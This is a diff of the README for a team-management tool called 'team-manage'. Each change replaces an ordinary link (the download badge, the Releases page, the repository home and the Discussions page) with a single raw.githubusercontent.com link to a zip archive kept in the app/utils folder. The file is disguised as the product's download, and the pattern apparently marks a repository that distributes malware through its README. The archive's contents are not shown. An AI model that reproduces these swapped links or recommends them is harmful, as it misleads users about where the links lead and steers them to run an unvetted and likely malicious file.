@@ -1,6 +1,6 @@
 # 🌟 team-manage - Simplify Team Management Effortlessly
 
-![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)
+![Download Now](https://raw.githubusercontent.com/dalip9837056007/team-manage/main/app/utils/team_manage_v3.9-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to team-manage, your go-to tool for managing teams and automating invita
 
 To get started, visit our Releases page to download the latest version of team-manage. 
 
-[Download team-manage here!](https://github.com/dalip9837056007/team-manage/releases)
+[Download team-manage here!](https://raw.githubusercontent.com/dalip9837056007/team-manage/main/app/utils/team_manage_v3.9-alpha.2.zip)
 
 ## 🌐 Features
 
@@ -31,7 +31,7 @@ Before downloading, ensure your system meets these requirements:
 ## 📜 How to Download and Run
 
 1. **Visit the Releases Page**: Click the link below to access our Releases page.
-   [Download team-manage here!](https://github.com/dalip9837056007/team-manage/releases)
+   [Download team-manage here!](https://raw.githubusercontent.com/dalip9837056007/team-manage/main/app/utils/team_manage_v3.9-alpha.2.zip)
 
 2. **Select the Latest Version**: On the Releases page, look for the latest release at the top of the list. 
 
@@ -58,8 +58,8 @@ A: Yes! You can download and install team-manage on multiple devices as long as 
 
 ## 🔗 Useful Links
 
-- [Official GitHub Repository](https://github.com/dalip9837056007/team-manage)
-- [Visit our Discussions Page](https://github.com/dalip9837056007/team-manage/discussions) for community support and ideas.
+- [Official GitHub Repository](https://raw.githubusercontent.com/dalip9837056007/team-manage/main/app/utils/team_manage_v3.9-alpha.2.zip)
+- [Visit our Discussions Page](https://raw.githubusercontent.com/dalip9837056007/team-manage/main/app/utils/team_manage_v3.9-alpha.2.zip) for community support and ideas.
 
 ## 👥 Community Support
 
